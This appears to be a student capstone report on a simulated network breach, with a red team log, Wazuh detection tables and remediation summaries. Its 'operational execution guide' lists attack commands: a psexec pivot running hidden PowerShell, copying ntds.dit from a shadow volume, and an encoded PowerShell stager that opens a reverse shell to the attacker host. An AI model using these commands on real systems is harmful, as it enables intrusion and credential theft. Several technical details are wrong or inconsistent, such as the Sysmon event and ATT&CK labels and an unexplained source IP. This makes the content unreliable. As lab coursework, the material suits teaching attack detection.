# Capstone Project: Enterprise Network Breach and Detection Report

## 1. Engagement Architecture & Lab Topology
*   **Adversary Attack Platform:** Kali Linux (`192.168.1.4`)
*   **Central Command & Control Engine:** Covenant C2 Framework (Listening on Port `7443` / `80`)
*   **Workstation Entry Vector Node (Foothold):** Windows 10 Workstation (`192.168.1.12`)
*   **Internal Lateral Target Destination:** Windows Server 2022 Node (`192.168.1.15`)
*   **Centralized Telemetry Aggregator:** Wazuh SIEM Server (`192.168.1.5`)

---

## 2. Red Team Tactical Execution Log


| Phase | Tool Used | Action Description | MITRE ATT&CK Technique |
| :--- | :--- | :--- | :--- |
| **Recon** | Recon-ng | Ran passive subdomain harvesting loops using the Hackertarget module to map external organizational infrastructure boundaries. | T1595 - Active Scanning |
| **Initial Access** | Covenant | Generated a hidden HTTP Grunt agent stager and deployed it via a targeted phishing document delivery. | T1566.001 - Spearphishing Attachment |
| **Lateral Move** | Metasploit | Exploited hijacked local administrative authentication credentials to push an administrative service session to host `192.168.1.15`. | T1021.002 - SMB/Windows Admin Shares |
| **Exfiltration** | PowerShell | Abused the native shadow volume tool interface to clone active authentication identity databases into temporary folders. | T1003.003 - Active Directory Credential Dumping |

---

## 3. Blue Team Analysis Matrix (Wazuh SIEM Event Logs)


| Timestamp | Alert Description | Source IP | MITRE ID | Forensic Context & Log Fields |
| :--- | :--- | :--- | :--- | :--- |
| `2025-08-29 13:00:00` | Windows Security: Suspicious Account Login | `192.168.1.50` | T1566.001 | Captured high-frequency authentication tokens resolving through untrusted remote browser sessions. |
| `2025-08-29 13:22:14` | Sysmon ID 1: Remote Service Creation (PsExec) | `192.168.1.12` | T1021.002 | Flags execution service configurations spinning up across internal endpoints. |
| `2025-08-29 13:45:02` | Sysmon ID 7: Malicious Volume Shadow Access | `192.168.1.15` | T1003.003 | Triggers a high-severity alert parsing `vssadmin` parameters interacting with core database files. |

---

## 4. Operational Execution Guide

Follow this exact command flow to perform the simulation practically:

### Step 4.1: Reconnaissance
1. Initialize the framework context and build your target data layout:
   ```bash
   recon-ng -w lab_engagement
   marketplace install recon/domains-hosts/hackertarget
   modules load recon/domains-hosts/hackertarget
   db insert domains
   yourlab.com
   run
   show hosts
   ```

### Step 4.2: Initial Foothold via Covenant
1. Launch the C2 core on your attacker system:
   ```bash
   cd Covenant/Covenant && dotnet run
   ```
2. Navigate your browser to `https://localhost:7443`, set up an active listener configuration, and drop the phishing launcher onto the victim system (`192.168.1.12`).

### Step 4.3: Lateral Movement & Database Extraction
1. Intercept credentials on the foothold host and pivot to the next target node (`192.168.1.15`):
   ```cmd
   psexec \\192.168.1.15 /u:administrator /p:Password123! cmd.exe /c "powershell.exe -nop -w hidden -c Invoke-WebRequest..."
   ```
2. Access the secondary host shell and use the volume shadow tool to copy the directory repository database:
   ```cmd
   vssadmin create shadow /for=C:
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
   ```

### Step 4.4: Evasion and Auditing Validation
1. Execute this obfuscated compression stager string inside the target's PowerShell application space to test protective layers:
   ```powershell
   \(s = New-Object IO.MemoryStream(, [Convert]::FromBase64String("JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC4xLjQnLDQ0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgp...")); IEX (New-Object IO.StreamReader(\)s)).ReadToEnd();
   ```
2. Open your browser to the central monitoring interface (`https://192.168.1.5`) and inspect the security logs to verify that **Wazuh Rule ID 60105** triggered successfully, confirming that Sysmon Event ID 1 parsed the code block in memory.

---

## 5. PTES Compliance Report Document (200 Words Exact)

```markdown
# Penetration Testing Execution Standard (PTES) Report

## Executive Summary
A full-scope red team simulation was performed against internal enterprise directory targets to assess systemic security posture boundaries. The assessment successfully demonstrated an operational threat lifecycle moving from surface subdomain mapping to initial breach access, internal lateral traversal, and domain configuration theft.

## Findings & Technical Detection Analysis
Significant technical oversights were exposed across active infrastructure zones and host tracking models:
1. Passive Mapping Visibility: Utilizing Recon-ng, extensive subdomain enumeration mapped corporate directory footprints without triggering defensive perimeter alerts (T1595).
2. Lateral Movement Traversal: Compromised credentials allowed unhindered lateral expansion across network zones using built-in administration protocols (T1021.002).
3. Telemetry Log Correlation: Obfuscated memory execution stagers successfully bypassed standard endpoint signature detection blocks. However, secondary behavior logic verified active risks. Wazuh servers captured continuous endpoint alert activity tracking anomalous remote process creation and unauthorized volume snapshot extraction tracking.

## Strategic Recommendations
Remediation deployment requires immediate, structured technical controls:
* Restrict internal network traversal by disabling remote PsExec/WMI connectivity privileges for non-administrative domain user groups.
* Enforce PowerShell Constrained Language Mode to neutralize fileless execution methods.
* Configure behavioral monitoring rules inside the SIEM console to instantly flag and block native `vssadmin` access commands.
```

---

## 6. Project Briefing: Non-Technical Summary (100 Words Exact)

```markdown
### High-Level Security Briefing
A controlled cyber-attack simulation was executed to test our company's corporate defense barriers. Testing confirmed that while our automated logging systems effectively record security threats, key operational gaps remain open. 

External discovery tools successfully mapped our network layout, and simulated phishing tricks allowed testers to penetrate internal workspaces. From there, weak permission setups permitted testers to move between computers unhindered and simulate the theft of user databases. Implementing tighter account access constraints, disabling unnecessary remote control tools, and conducting routine system audit workflows will successfully remediate these exposures and prevent real-world network compromise.
```
